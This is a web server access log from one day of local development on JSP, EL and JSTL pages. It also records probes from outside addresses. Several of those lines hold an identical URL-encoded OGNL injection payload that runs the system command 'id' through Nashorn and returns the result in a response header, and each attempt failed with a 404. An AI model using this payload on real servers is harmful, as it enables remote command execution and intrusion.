127.0.0.1 - - [08/Sep/2023:09:18:50 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:09:18:54 +0900] "GET /ptj0908/acorn HTTP/1.1" 404 824
0:0:0:0:0:0:0:1 - - [08/Sep/2023:09:18:58 +0900] "GET /favicon.ico HTTP/1.1" 404 818
0:0:0:0:0:0:0:1 - - [08/Sep/2023:09:19:15 +0900] "GET /ptj0908/acorn HTTP/1.1" 200 687
127.0.0.1 - - [08/Sep/2023:09:31:50 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:09:31:52 +0900] "GET /ptj0908/acorn HTTP/1.1" 500 3698
0:0:0:0:0:0:0:1 - - [08/Sep/2023:09:32:29 +0900] "GET /ptj0908/acorn HTTP/1.1" 500 3698
127.0.0.1 - - [08/Sep/2023:09:33:05 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:09:33:07 +0900] "GET /ptj0908/acorn HTTP/1.1" 200 690
0:0:0:0:0:0:0:1 - - [08/Sep/2023:09:33:23 +0900] "GET /ptj0908/acorn HTTP/1.1" 200 770
127.0.0.1 - - [08/Sep/2023:09:47:12 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:09:47:13 +0900] "GET /ptj0908/el1 HTTP/1.1" 200 226
0:0:0:0:0:0:0:1 - - [08/Sep/2023:10:05:21 +0900] "GET /ptj0908/el1 HTTP/1.1" 500 8688
0:0:0:0:0:0:0:1 - - [08/Sep/2023:10:05:23 +0900] "GET /ptj0908/el1 HTTP/1.1" 200 226
0:0:0:0:0:0:0:1 - - [08/Sep/2023:10:05:23 +0900] "GET /ptj0908/el1 HTTP/1.1" 200 226
0:0:0:0:0:0:0:1 - - [08/Sep/2023:10:05:24 +0900] "GET /ptj0908/el1 HTTP/1.1" 200 226
0:0:0:0:0:0:0:1 - - [08/Sep/2023:10:05:24 +0900] "GET /ptj0908/el1 HTTP/1.1" 200 226
0:0:0:0:0:0:0:1 - - [08/Sep/2023:10:05:24 +0900] "GET /ptj0908/el1 HTTP/1.1" 200 226
0:0:0:0:0:0:0:1 - - [08/Sep/2023:10:05:24 +0900] "GET /ptj0908/el1 HTTP/1.1" 200 226
0:0:0:0:0:0:0:1 - - [08/Sep/2023:10:05:24 +0900] "GET /ptj0908/el1 HTTP/1.1" 200 226
0:0:0:0:0:0:0:1 - - [08/Sep/2023:10:05:25 +0900] "GET /ptj0908/el1 HTTP/1.1" 200 226
0:0:0:0:0:0:0:1 - - [08/Sep/2023:10:05:29 +0900] "GET /ptj0908/el1 HTTP/1.1" 500 8688
0:0:0:0:0:0:0:1 - - [08/Sep/2023:10:05:30 +0900] "GET /ptj0908/el1 HTTP/1.1" 200 226
0:0:0:0:0:0:0:1 - - [08/Sep/2023:10:05:30 +0900] "GET /ptj0908/el1 HTTP/1.1" 200 226
0:0:0:0:0:0:0:1 - - [08/Sep/2023:10:05:31 +0900] "GET /ptj0908/el1 HTTP/1.1" 200 226
0:0:0:0:0:0:0:1 - - [08/Sep/2023:10:05:31 +0900] "GET /ptj0908/el1 HTTP/1.1" 200 226
127.0.0.1 - - [08/Sep/2023:10:05:40 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:10:05:41 +0900] "GET /ptj0908/el1 HTTP/1.1" 500 8688
0:0:0:0:0:0:0:1 - - [08/Sep/2023:10:06:04 +0900] "GET /ptj0908/el1 HTTP/1.1" 500 8688
0:0:0:0:0:0:0:1 - - [08/Sep/2023:10:06:04 +0900] "GET /ptj0908/el1 HTTP/1.1" 500 3670
0:0:0:0:0:0:0:1 - - [08/Sep/2023:10:06:05 +0900] "GET /ptj0908/el1 HTTP/1.1" 500 3670
127.0.0.1 - - [08/Sep/2023:10:06:12 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:10:06:13 +0900] "GET /ptj0908/el1 HTTP/1.1" 500 8688
0:0:0:0:0:0:0:1 - - [08/Sep/2023:10:06:31 +0900] "GET /ptj0908/el1 HTTP/1.1" 200 258
0:0:0:0:0:0:0:1 - - [08/Sep/2023:10:09:02 +0900] "GET /ptj0908/el1 HTTP/1.1" 200 293
103.135.35.58 - - [08/Sep/2023:10:27:57 +0900] "GET /%24%7BClass.forName%28%22com.opensymphony.webwork.ServletActionContext%22%29.getMethod%28%22getResponse%22%2Cnull%29.invoke%28null%2Cnull%29.setHeader%28%22X-Cmd-Response%22%2CClass.forName%28%22javax.script.ScriptEngineManager%22%29.newInstance%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22var%20d%3D%27%27%3Bvar%20i%20%3D%20java.lang.Runtime.getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%3B%20while%28i.available%28%29%29d%2B%3DString.fromCharCode%28i.read%28%29%29%3Bd%22%29%29%7D/ HTTP/1.1" 404 1312
127.0.0.1 - - [08/Sep/2023:10:36:25 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:10:36:26 +0900] "GET /ptj0908/el3 HTTP/1.1" 200 144
0:0:0:0:0:0:0:1 - - [08/Sep/2023:10:36:58 +0900] "GET /ptj0908/el3 HTTP/1.1" 200 145
0:0:0:0:0:0:0:1 - - [08/Sep/2023:10:36:58 +0900] "GET /ptj0908/el3 HTTP/1.1" 200 145
0:0:0:0:0:0:0:1 - - [08/Sep/2023:10:36:59 +0900] "GET /ptj0908/el3 HTTP/1.1" 200 145
0:0:0:0:0:0:0:1 - - [08/Sep/2023:10:36:59 +0900] "GET /ptj0908/el3 HTTP/1.1" 200 145
0:0:0:0:0:0:0:1 - - [08/Sep/2023:10:36:59 +0900] "GET /ptj0908/el3 HTTP/1.1" 200 145
0:0:0:0:0:0:0:1 - - [08/Sep/2023:10:36:59 +0900] "GET /ptj0908/el3 HTTP/1.1" 200 145
0:0:0:0:0:0:0:1 - - [08/Sep/2023:10:37:10 +0900] "GET /ptj0908/el3 HTTP/1.1" 200 191
0:0:0:0:0:0:0:1 - - [08/Sep/2023:10:41:37 +0900] "GET /ptj0908/el3 HTTP/1.1" 200 480
127.0.0.1 - - [08/Sep/2023:10:47:21 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:10:47:22 +0900] "GET /ptj0908/el4 HTTP/1.1" 200 953
0:0:0:0:0:0:0:1 - - [08/Sep/2023:10:47:32 +0900] "GET /ptj0908/el4?id=1234 HTTP/1.1" 200 959
0:0:0:0:0:0:0:1 - - [08/Sep/2023:10:47:47 +0900] "GET /ptj0908/el4?id=1234&pw=4321 HTTP/1.1" 200 969
43.143.137.26 - - [08/Sep/2023:10:49:00 +0900] "GET /%24%7BClass.forName%28%22com.opensymphony.webwork.ServletActionContext%22%29.getMethod%28%22getResponse%22%2Cnull%29.invoke%28null%2Cnull%29.setHeader%28%22X-Cmd-Response%22%2CClass.forName%28%22javax.script.ScriptEngineManager%22%29.newInstance%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22var%20d%3D%27%27%3Bvar%20i%20%3D%20java.lang.Runtime.getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%3B%20while%28i.available%28%29%29d%2B%3DString.fromCharCode%28i.read%28%29%29%3Bd%22%29%29%7D/ HTTP/1.1" 404 1312
127.0.0.1 - - [08/Sep/2023:11:05:34 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:11:05:35 +0900] "GET /ptj0908/el5 HTTP/1.1" 200 354
0:0:0:0:0:0:0:1 - - [08/Sep/2023:11:07:00 +0900] "GET /ptj0908/el5 HTTP/1.1" 200 356
0:0:0:0:0:0:0:1 - - [08/Sep/2023:11:07:00 +0900] "GET /ptj0908/el5 HTTP/1.1" 200 356
0:0:0:0:0:0:0:1 - - [08/Sep/2023:11:07:17 +0900] "GET /ptj0908/el5 HTTP/1.1" 200 361
0:0:0:0:0:0:0:1 - - [08/Sep/2023:11:08:19 +0900] "GET /ptj0908/el5 HTTP/1.1" 200 377
0:0:0:0:0:0:0:1 - - [08/Sep/2023:11:09:27 +0900] "GET /ptj0908/el5 HTTP/1.1" 200 382
127.0.0.1 - - [08/Sep/2023:11:19:57 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:11:19:58 +0900] "GET /ptj0908/jstl1 HTTP/1.1" 200 401
0:0:0:0:0:0:0:1 - - [08/Sep/2023:11:20:15 +0900] "GET /ptj0908/jstl1 HTTP/1.1" 200 401
0:0:0:0:0:0:0:1 - - [08/Sep/2023:11:20:16 +0900] "GET /ptj0908/jstl1 HTTP/1.1" 200 401
127.0.0.1 - - [08/Sep/2023:11:20:24 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:11:20:25 +0900] "GET /ptj0908/jstl1 HTTP/1.1" 200 481
0:0:0:0:0:0:0:1 - - [08/Sep/2023:11:21:09 +0900] "GET /ptj0908/jstl1 HTTP/1.1" 200 582
127.0.0.1 - - [08/Sep/2023:11:33:17 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:11:33:18 +0900] "GET /ptj0908/jstl2 HTTP/1.1" 200 564
127.0.0.1 - - [08/Sep/2023:11:39:28 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:11:39:29 +0900] "GET /ptj0908/jstl3 HTTP/1.1" 200 145
0:0:0:0:0:0:0:1 - - [08/Sep/2023:11:39:37 +0900] "GET /ptj0908/jstl3 HTTP/1.1" 200 145
127.0.0.1 - - [08/Sep/2023:11:39:45 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:11:39:45 +0900] "GET /ptj0908/jstl3 HTTP/1.1" 200 145
0:0:0:0:0:0:0:1 - - [08/Sep/2023:11:41:05 +0900] "GET /ptj0908/jstl3 HTTP/1.1" 200 167
127.0.0.1 - - [08/Sep/2023:11:41:13 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:11:41:14 +0900] "GET /ptj0908/jstl3 HTTP/1.1" 200 189
0:0:0:0:0:0:0:1 - - [08/Sep/2023:11:44:06 +0900] "GET /ptj0908/jstl3 HTTP/1.1" 200 204
0:0:0:0:0:0:0:1 - - [08/Sep/2023:11:44:07 +0900] "GET /ptj0908/jstl3 HTTP/1.1" 200 204
103.135.35.58 - - [08/Sep/2023:11:55:33 +0900] "GET /%24%7BClass.forName%28%22com.opensymphony.webwork.ServletActionContext%22%29.getMethod%28%22getResponse%22%2Cnull%29.invoke%28null%2Cnull%29.setHeader%28%22X-Cmd-Response%22%2CClass.forName%28%22javax.script.ScriptEngineManager%22%29.newInstance%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22var%20d%3D%27%27%3Bvar%20i%20%3D%20java.lang.Runtime.getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%3B%20while%28i.available%28%29%29d%2B%3DString.fromCharCode%28i.read%28%29%29%3Bd%22%29%29%7D/ HTTP/1.1" 404 1312
127.0.0.1 - - [08/Sep/2023:12:06:20 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:06:21 +0900] "GET /ptj0908/jstl4 HTTP/1.1" 200 160
127.0.0.1 - - [08/Sep/2023:12:09:27 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:09:28 +0900] "GET /ptj0908/jstl4 HTTP/1.1" 200 237
127.0.0.1 - - [08/Sep/2023:12:14:18 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:14:19 +0900] "GET /ptj0908/jstl4 HTTP/1.1" 200 342
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:16:54 +0900] "GET /ptj0908/jstl4 HTTP/1.1" 200 354
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:20:03 +0900] "GET /ptj0908/jstl4 HTTP/1.1" 500 2725
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:20:04 +0900] "GET /ptj0908/jstl4 HTTP/1.1" 200 354
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:20:04 +0900] "GET /ptj0908/jstl4 HTTP/1.1" 200 354
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:20:04 +0900] "GET /ptj0908/jstl4 HTTP/1.1" 200 354
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:20:05 +0900] "GET /ptj0908/jstl4 HTTP/1.1" 200 354
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:20:06 +0900] "GET /ptj0908/jstl4 HTTP/1.1" 200 354
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:20:06 +0900] "GET /ptj0908/jstl4 HTTP/1.1" 200 354
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:20:06 +0900] "GET /ptj0908/jstl4 HTTP/1.1" 200 354
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:20:06 +0900] "GET /ptj0908/jstl4 HTTP/1.1" 200 354
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:20:30 +0900] "GET /ptj0908/jstl4 HTTP/1.1" 500 2725
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:20:31 +0900] "GET /ptj0908/jstl4 HTTP/1.1" 200 354
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:20:31 +0900] "GET /ptj0908/jstl4 HTTP/1.1" 200 354
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:20:32 +0900] "GET /ptj0908/jstl4 HTTP/1.1" 200 354
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:20:32 +0900] "GET /ptj0908/jstl4 HTTP/1.1" 200 354
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:20:40 +0900] "GET /ptj0908/jstl4 HTTP/1.1" 500 2725
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:20:42 +0900] "GET /ptj0908/jstl4 HTTP/1.1" 200 354
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:20:43 +0900] "GET /ptj0908/jstl4 HTTP/1.1" 200 354
127.0.0.1 - - [08/Sep/2023:12:20:55 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:20:55 +0900] "GET /ptj0908/jstl4 HTTP/1.1" 500 2725
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:21:40 +0900] "GET /ptj0908/jstl4 HTTP/1.1" 500 2725
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:21:41 +0900] "GET /ptj0908/jstl4 HTTP/1.1" 500 3690
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:21:43 +0900] "GET /ptj0908/jstl4 HTTP/1.1" 500 3690
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:21:43 +0900] "GET /ptj0908/jstl4 HTTP/1.1" 500 3690
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:21:43 +0900] "GET /ptj0908/jstl4 HTTP/1.1" 500 3690
127.0.0.1 - - [08/Sep/2023:12:22:00 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:22:01 +0900] "GET /ptj0908/jstl4 HTTP/1.1" 500 2725
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:22:17 +0900] "GET /ptj0908/jstl4 HTTP/1.1" 200 379
127.0.0.1 - - [08/Sep/2023:12:22:27 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:22:28 +0900] "GET /ptj0908/jstl4 HTTP/1.1" 200 379
127.0.0.1 - - [08/Sep/2023:12:32:45 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:32:46 +0900] "GET /ptj0908/jstl5 HTTP/1.1" 200 271
118.193.59.41 - - [08/Sep/2023:12:33:08 +0900] "-" 400 2163
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:33:17 +0900] "GET /ptj0908/jstl5 HTTP/1.1" 200 225
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:33:18 +0900] "GET /ptj0908/jstl5 HTTP/1.1" 200 225
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:33:18 +0900] "GET /ptj0908/jstl5 HTTP/1.1" 200 225
118.193.59.41 - - [08/Sep/2023:12:33:21 +0900] "GET / HTTP/1.1" 404 731
127.0.0.1 - - [08/Sep/2023:12:33:26 +0900] "GET / HTTP/1.1" 404 807
118.193.59.41 - - [08/Sep/2023:12:33:26 +0900] "GET /favicon.ico HTTP/1.1" 404 818
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:33:27 +0900] "GET /ptj0908/jstl5 HTTP/1.1" 200 225
118.193.59.41 - - [08/Sep/2023:12:33:28 +0900] "GET /robots.txt HTTP/1.1" 404 817
118.193.59.41 - - [08/Sep/2023:12:33:29 +0900] "GET /sitemap.xml HTTP/1.1" 404 818
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:33:50 +0900] "GET /ptj0908/jstl5 HTTP/1.1" 200 225
127.0.0.1 - - [08/Sep/2023:12:34:00 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:34:00 +0900] "GET /ptj0908/jstl5 HTTP/1.1" 200 225
127.0.0.1 - - [08/Sep/2023:12:34:48 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:34:48 +0900] "GET /ptj0908/jstl5 HTTP/1.1" 200 450
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:39:37 +0900] "GET /ptj0908/jstl5 HTTP/1.1" 200 559
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:39:37 +0900] "GET /ptj0908/img/%EB%8F%88 HTTP/1.1" 404 836
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:39:37 +0900] "GET /ptj0908/img/c HTTP/1.1" 404 828
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:39:37 +0900] "GET /ptj0908/img/%EB%B6%80 HTTP/1.1" 404 836
127.0.0.1 - - [08/Sep/2023:12:39:47 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:39:47 +0900] "GET /ptj0908/jstl5 HTTP/1.1" 200 559
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:39:47 +0900] "GET /ptj0908/img/%EB%B6%80 HTTP/1.1" 404 836
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:39:47 +0900] "GET /ptj0908/img/c HTTP/1.1" 404 828
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:39:47 +0900] "GET /ptj0908/img/%EB%8F%88 HTTP/1.1" 404 836
127.0.0.1 - - [08/Sep/2023:12:40:26 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:40:27 +0900] "GET /ptj0908/jstl5 HTTP/1.1" 200 571
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:40:27 +0900] "GET /ptj0908/img/%EB%B6%80.jpg HTTP/1.1" 200 32363
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:40:27 +0900] "GET /ptj0908/img/c.jpg HTTP/1.1" 200 40412
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:40:27 +0900] "GET /ptj0908/img/%EB%8F%88.jpg HTTP/1.1" 200 32663
127.0.0.1 - - [08/Sep/2023:12:46:35 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:12:46:36 +0900] "GET /ptj0908/jstl7 HTTP/1.1" 200 283
116.147.37.17 - - [08/Sep/2023:12:57:46 +0900] "GET /%24%7BClass.forName%28%22com.opensymphony.webwork.ServletActionContext%22%29.getMethod%28%22getResponse%22%2Cnull%29.invoke%28null%2Cnull%29.setHeader%28%22X-Cmd-Response%22%2CClass.forName%28%22javax.script.ScriptEngineManager%22%29.newInstance%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22var%20d%3D%27%27%3Bvar%20i%20%3D%20java.lang.Runtime.getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%3B%20while%28i.available%28%29%29d%2B%3DString.fromCharCode%28i.read%28%29%29%3Bd%22%29%29%7D/ HTTP/1.1" 404 1312
183.111.204.170 - - [08/Sep/2023:13:23:44 +0900] "GET /%24%7BClass.forName%28%22com.opensymphony.webwork.ServletActionContext%22%29.getMethod%28%22getResponse%22%2Cnull%29.invoke%28null%2Cnull%29.setHeader%28%22X-Cmd-Response%22%2CClass.forName%28%22javax.script.ScriptEngineManager%22%29.newInstance%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22var%20d%3D%27%27%3Bvar%20i%20%3D%20java.lang.Runtime.getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%3B%20while%28i.available%28%29%29d%2B%3DString.fromCharCode%28i.read%28%29%29%3Bd%22%29%29%7D/ HTTP/1.1" 404 1312
101.42.9.91 - - [08/Sep/2023:14:02:54 +0900] "GET /%24%7BClass.forName%28%22com.opensymphony.webwork.ServletActionContext%22%29.getMethod%28%22getResponse%22%2Cnull%29.invoke%28null%2Cnull%29.setHeader%28%22X-Cmd-Response%22%2CClass.forName%28%22javax.script.ScriptEngineManager%22%29.newInstance%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22var%20d%3D%27%27%3Bvar%20i%20%3D%20java.lang.Runtime.getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%3B%20while%28i.available%28%29%29d%2B%3DString.fromCharCode%28i.read%28%29%29%3Bd%22%29%29%7D/ HTTP/1.1" 404 1312
153.0.155.5 - - [08/Sep/2023:14:16:18 +0900] "GET /%24%7BClass.forName%28%22com.opensymphony.webwork.ServletActionContext%22%29.getMethod%28%22getResponse%22%2Cnull%29.invoke%28null%2Cnull%29.setHeader%28%22X-Cmd-Response%22%2CClass.forName%28%22javax.script.ScriptEngineManager%22%29.newInstance%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22var%20d%3D%27%27%3Bvar%20i%20%3D%20java.lang.Runtime.getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%3B%20while%28i.available%28%29%29d%2B%3DString.fromCharCode%28i.read%28%29%29%3Bd%22%29%29%7D/ HTTP/1.1" 404 1312
127.0.0.1 - - [08/Sep/2023:14:26:24 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:14:26:25 +0900] "GET /ptj0908/no1 HTTP/1.1" 404 853
127.0.0.1 - - [08/Sep/2023:14:26:47 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:14:26:48 +0900] "GET /ptj0908/no1 HTTP/1.1" 200 315
127.0.0.1 - - [08/Sep/2023:14:30:18 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:14:30:20 +0900] "GET /ptj0908/no2 HTTP/1.1" 200 131
127.0.0.1 - - [08/Sep/2023:14:31:42 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:14:31:43 +0900] "GET /ptj0908/no2 HTTP/1.1" 200 152
0:0:0:0:0:0:0:1 - - [08/Sep/2023:14:32:11 +0900] "GET /ptj0908/no2 HTTP/1.1" 200 152
0:0:0:0:0:0:0:1 - - [08/Sep/2023:14:32:12 +0900] "GET /ptj0908/no2 HTTP/1.1" 200 152
127.0.0.1 - - [08/Sep/2023:14:35:32 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:14:35:33 +0900] "GET /ptj0908/no2 HTTP/1.1" 200 239
127.0.0.1 - - [08/Sep/2023:14:44:26 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:14:44:26 +0900] "GET /ptj0908/no3 HTTP/1.1" 500 3123
127.0.0.1 - - [08/Sep/2023:14:45:24 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:14:45:26 +0900] "GET /ptj0908/no3 HTTP/1.1" 200 154
216.218.206.69 - - [08/Sep/2023:14:45:31 +0900] "GET / HTTP/1.1" 404 807
216.218.206.69 - - [08/Sep/2023:14:45:47 +0900] "GET /favicon.ico HTTP/1.1" 404 818
216.218.206.69 - - [08/Sep/2023:14:45:50 +0900] "GET /?format=json HTTP/1.1" 404 807
216.218.206.69 - - [08/Sep/2023:14:45:53 +0900] "CONNECT www.shadowserver.org:443 HTTP/1.1" 501 755
0:0:0:0:0:0:0:1 - - [08/Sep/2023:14:45:59 +0900] "GET /ptj0908/no3 HTTP/1.1" 200 154
0:0:0:0:0:0:0:1 - - [08/Sep/2023:14:46:00 +0900] "GET /ptj0908/no3 HTTP/1.1" 200 154
127.0.0.1 - - [08/Sep/2023:14:52:28 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:14:52:29 +0900] "GET /ptj0908/no4 HTTP/1.1" 200 161
0:0:0:0:0:0:0:1 - - [08/Sep/2023:14:52:45 +0900] "GET /ptj0908/no4 HTTP/1.1" 200 176
127.0.0.1 - - [08/Sep/2023:14:54:35 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:14:54:36 +0900] "GET /ptj0908/no5 HTTP/1.1" 200 267
127.0.0.1 - - [08/Sep/2023:14:56:52 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:14:56:53 +0900] "GET /ptj0908/no6 HTTP/1.1" 200 239
0:0:0:0:0:0:0:1 - - [08/Sep/2023:14:57:11 +0900] "GET /ptj0908/no6 HTTP/1.1" 200 290
0:0:0:0:0:0:0:1 - - [08/Sep/2023:14:57:23 +0900] "GET /ptj0908/no6 HTTP/1.1" 200 326
0:0:0:0:0:0:0:1 - - [08/Sep/2023:14:57:32 +0900] "GET /ptj0908/no6 HTTP/1.1" 200 326
127.0.0.1 - - [08/Sep/2023:14:59:18 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:14:59:19 +0900] "GET /ptj0908/no7 HTTP/1.1" 200 1971
0:0:0:0:0:0:0:1 - - [08/Sep/2023:14:59:33 +0900] "GET /ptj0908/no7 HTTP/1.1" 200 1773
127.0.0.1 - - [08/Sep/2023:15:16:10 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:15:16:12 +0900] "GET /ptj0908/no8 HTTP/1.1" 200 197
127.0.0.1 - - [08/Sep/2023:15:17:39 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:15:17:40 +0900] "GET /ptj0908/no8 HTTP/1.1" 200 424
127.0.0.1 - - [08/Sep/2023:15:33:16 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:15:33:17 +0900] "GET /ptj0908/no9 HTTP/1.1" 200 133
127.0.0.1 - - [08/Sep/2023:15:35:19 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:15:35:20 +0900] "GET /ptj0908/no9 HTTP/1.1" 500 3433
0:0:0:0:0:0:0:1 - - [08/Sep/2023:15:35:38 +0900] "GET /ptj0908/no9 HTTP/1.1" 200 140
0:0:0:0:0:0:0:1 - - [08/Sep/2023:15:36:11 +0900] "GET /ptj0908/no9 HTTP/1.1" 200 165
127.0.0.1 - - [08/Sep/2023:15:59:16 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:15:59:16 +0900] "GET /ct_0907/servlet/acorn3.a HTTP/1.1" 404 839
0:0:0:0:0:0:0:1 - - [08/Sep/2023:15:59:58 +0900] "GET /ct_0907/servlet/acorn3.a HTTP/1.1" 404 839
127.0.0.1 - - [08/Sep/2023:16:00:11 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:16:00:12 +0900] "GET /ct_0907/servlet/acorn3.a HTTP/1.1" 404 839
0:0:0:0:0:0:0:1 - - [08/Sep/2023:16:00:21 +0900] "GET /ct_0907/servlet/acorn3.a HTTP/1.1" 404 839
0:0:0:0:0:0:0:1 - - [08/Sep/2023:16:00:21 +0900] "GET /favicon.ico HTTP/1.1" 404 818
0:0:0:0:0:0:0:1 - - [08/Sep/2023:16:01:06 +0900] "GET /ct_0907/WEB-INF/views/a3.jsp HTTP/1.1" 404 721
0:0:0:0:0:0:0:1 - - [08/Sep/2023:16:01:11 +0900] "GET /ct_0907/WEB-INF/views/a3.jsp HTTP/1.1" 404 721
0:0:0:0:0:0:0:1 - - [08/Sep/2023:16:01:14 +0900] "GET /ct_0907/WEB-INF/views/a3.jsp HTTP/1.1" 404 721
127.0.0.1 - - [08/Sep/2023:16:01:58 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [08/Sep/2023:16:02:00 +0900] "GET /ct_0907/acorn3 HTTP/1.1" 200 926
0:0:0:0:0:0:0:1 - - [08/Sep/2023:16:02:11 +0900] "GET /ct_0907/acorn3 HTTP/1.1" 200 1026
